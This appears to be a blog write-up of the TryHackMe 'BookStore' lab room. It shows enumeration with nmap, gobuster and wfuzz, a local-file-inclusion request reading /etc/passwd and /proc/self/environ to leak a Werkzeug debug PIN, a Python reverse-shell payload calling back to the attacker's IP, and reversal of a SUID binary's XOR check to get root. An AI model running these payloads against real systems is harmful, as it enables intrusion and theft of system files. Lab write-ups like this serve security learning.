---
title: "BookStore TryHackMe Writeup"
last_modified_at: 2020-11-29T11:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - rest api enumeration
  - api parameter bruteforcing
  - wfuzz
  - ghidra
  - LFI
  - nmap
  - SUID
---
<img alt="bookstore" src="/assets/images/thm/bookstore/bookstore.jpeg" width="200px" height="50px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[BookStore](https://tryhackme.com/room/bookstoreoc) is a medium rated room on TryHackMe by [sidchn](https://tryhackme.com/p/sidchn). Parameter which was vulnerable to LFI was found after bruteforcing using wfuzz. LFI was used to get the debugger pin for python console and we can execute code as user sid. On the box there was a custom binary with SUID bit enabled, which was reversed using ghidra and used to get a root shell on the box. 

# Port Scan
### All Port Scan
```console
local@local:~/Documents/tryhackme/bookstore$ nmap -p- --min-rate 10000 -v -oN nmap/all-ports 10.10.90.247
Nmap scan report for 10.10.90.247
Host is up (0.31s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Nov 28 11:47:02 2020 -- 1 IP address (1 host up) scanned in 40.51 seconds
```

### Detail Scan
```console
local@local:~/Documents/tryhackme/bookstore$ nmap -p22,80,5000 -A -oN nmap/detail 10.10.24.77
Nmap scan report for 10.10.24.77
Host is up (0.37s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 29 11:00:20 2020 -- 1 IP address (1 host up) scanned in 21.04 seconds
```
we have two webserver running one on port 80 and another on port 5000.

# Port 80
![1](/assets/images/thm/bookstore/1.png)

## Directory Bruteforcing
```console
local@local:~/Documents/tryhackme/bookstore$ gobuster dir -u http://10.10.24.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html 
/images (Status: 301)
/login.html (Status: 200)
/index.html (Status: 200)
/books.html (Status: 200)
/assets (Status: 301)
/javascript (Status: 301)
/LICENSE.txt (Status: 200)
```
Checking on **/assets**
![2](/assets/images/thm/bookstore/2.png)
And inside js we get a api.js file.

### Contents of api.js
```js
function getAPIURL() {
var str = window.location.hostname;
str = str + ":5000"
return str;

    }


async function getUsers() {
    var u=getAPIURL();
    let url = 'http://' + u + '/api/v2/resources/books/random4';
    try {
        let res = await fetch(url);
	return await res.json();
    } catch (error) {
        console.log(error);
    }
}

async function renderUsers() {
    let users = await getUsers();
    let html = '';
    users.forEach(user => {
        let htmlSegment = `<div class="user">
	 	        <h2>Title : ${user.title}</h3> <br>
                        <h3>First Sentence : </h3> <br>
			<h4>${user.first_sentence}</h4><br>
                        <h1>Author: ${user.author} </h1> <br> <br>        
                </div>`;

        html += htmlSegment;
   });
   
    let container = document.getElementById("respons");
    container.innerHTML = html;
}
renderUsers();
//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```
And we can see the comment at the end saying there was a parameter on the api  of the previous version which was vulnerable to local file inclusion.

# Port 5000
![3](/assets/images/thm/bookstore/3.png)

## Directory Bruteforcing
```
local@local:~/Documents/tryhackme/bookstore$ wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -c --hc 404 -t 50 http://10.10.192.216:5000/FUZZ
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.192.216:5000/FUZZ
Total requests: 30000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000078:   200        11 L     90 W     825 Ch      "api"                                                                                                          
000001450:   200        52 L     186 W    1985 Ch     "console"                                                                                                      
```

We find **/api** and **/console**.

## Checking /api
![4](/assets/images/thm/bookstore/4.png)  
     
         
We can see the different endpoints and if we notice that there is v2 on the link which surely means the updated version of the api and if we have to guess the previous version, it must start with **/api/v1** as the earlier version of the api has a parameter which is vulnerable to  LFI. 

## Parameter Bruteforcing
```console
local@local:~/Documents/tryhackme/bookstore$ wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt -c --hc 404 -t 40 http://10.10.192.216:5000/api/v1/resources/books?FUZZ=/etc/passwd 
********************************************************
* Wfuzz 3.0.3 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.192.216:5000/api/v1/resources/books?FUZZ=/etc/passwd
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                        
===================================================================

000000001:   200        1 L      1 W      3 Ch        "id"                                                                                                           
000000069:   200        30 L     38 W     1555 Ch     "show"                                                                                                         
000000100:   200        1 L      1 W      3 Ch        "author"                                                                                                       
000000815:   200        1 L      1 W      3 Ch        "published"                                                                                                    

Total time: 0
Processed Requests: 2588
Filtered Requests: 2584
Requests/sec.: 0
```
We find a new parameter **show** which was not shown on the documentation.

## LFI
```console
local@local:~/Documents/tryhackme/bookstore$ curl http://10.10.192.216:5000/api/v1/resources/books?show=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```
We can see the contents of /etc/passwd and we can see there is a user sid on the box. So, for code execution first thing I tried was to get the private key of user sid if he has one, but I got an error which means either we cant read the file or the file doesnot exists.

## LFI to RCE
There are few files that I like to check whether  we have read permsisions or not to get code execution. Few of the files are

-    /var/log/apache/access.log
-    /var/log/apache/error.log
-    /var/log/vsftpd.log
-    /var/log/sshd.log
-    /var/log/mail
-    /proc/self/environ
-    /proc/self/fd

And it turned out we can access /proc/self/environ.

```console
LANG=en_US.UTF-8OLDPWD=/home/sidPWD=/home/sidHOME=/home/sidWERKZEUG_DEBUG_PIN=123-321-135SHELL=/bin/shSHLVL=1LOGNAME=sidPATH=/usr/bin:/bin_=/usr/bin/python3WERKZEUG_SERVER_FD=3WERKZEUG_RUN_MAIN=true
```
And here we  find the debug pin for the console which means we can log in the debug console and execute arbitary commands on the box using python.

## Shell as user sid
![5](/assets/images/thm/bookstore/5.png)
Now that we can execute code as Sid, lets try and get a reverse shell.

I used the python reverse shell payload to get a shell.
```py
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.6.31.213",9001));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
And we get a shell back.
```console
local@local:~/Documents/tryhackme/bookstore$ nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.192.216 44652
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(sid) gid=1000(sid) groups=1000(sid)
```

## Getting a Proper Shell
Now this shell is a bit hard to work with as it is not interactive. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. So We have to make this session a interactive session.

## Getting a proper TTY
Now lets get a proper shell with auto completion.
```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
Hit CRTL+z to background the current process and on local box type
```console
local@local:~/Documents/tryhackme/the_blob_blog$ stty raw -echo
```
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```console
sid@bookstore:~$  export TERM=xterm
```
Now we have a proper shell.

## Reading user.txt
```console
sid@bookstore:~$ cat user.txt 
4ea65eb8**************b964ab
```

# Privilege Escalation
On the home of user sid
```console
sid@bookstore:~$ ls -la
total 80
drwxr-xr-x 5 sid  sid   4096 Oct 20 03:16 .
drwxr-xr-x 3 root root  4096 Oct 20 02:21 ..
-r--r--r-- 1 sid  sid   4635 Oct 20 02:52 api.py
-r-xr-xr-x 1 sid  sid    160 Oct 14 21:49 api-up.sh
-r--r----- 1 sid  sid    116 Nov 29 15:08 .bash_history
-rw-r--r-- 1 sid  sid    220 Oct 20 02:21 .bash_logout
-rw-r--r-- 1 sid  sid   3771 Oct 20 02:21 .bashrc
-rw-rw-r-- 1 sid  sid  16384 Oct 19 22:03 books.db
drwx------ 2 sid  sid   4096 Oct 20 02:53 .cache
drwx------ 3 sid  sid   4096 Oct 20 02:53 .gnupg
drwxrwxr-x 3 sid  sid   4096 Oct 20 02:29 .local
-rw-r--r-- 1 sid  sid    807 Oct 20 02:21 .profile
-rwsrwsr-x 1 root sid   8488 Oct 20 03:01 try-harder
-r--r----- 1 sid  sid     33 Oct 15 11:14 user.txt
```
There is a file called **try-harder** which is owned by root and has SUID bit enabled, which means it runs with the effective privileges of  root when it runs. And if we can find any misconfigurations on this type of binary, we can execute code as root. So I donwloaded this file locally and reversed using ghidra.

## Content of main from ghidra
```c
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
We can see there is a check being implemented, and if we pass the check we get a root shell as root.

### Check being implemented
```c
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  ```
  Here the variable **local_1c** ( user input)  is xored with 0x1116 and with another variable **local_18** having value 0x5db3 and if the ouput from this operation is equal to 0x5dcd21f4, we get a root shell.

### XOR Property
  ```
  c = a ^ b 
  a = c ^ b
  ```
  If we XOR a with b to get c, then we can XOR c with b to get a. Using this logic, we can get the value of the variable that we want.

```console
local@local:~/Documents/tryhackme/bookstore$ python
Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x1116 ^ 0x5db3 ^ 0x5dcd21f4
1573743953
```
## Shell as root
```console
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
root@bookstore:~# id
uid=0(root) gid=1000(sid) groups=1000(sid)
```
And we get a shell as root.

# Reading root flag
```console
root@bookstore:~# cat /root/root.txt 
e29b05f************93158e3
```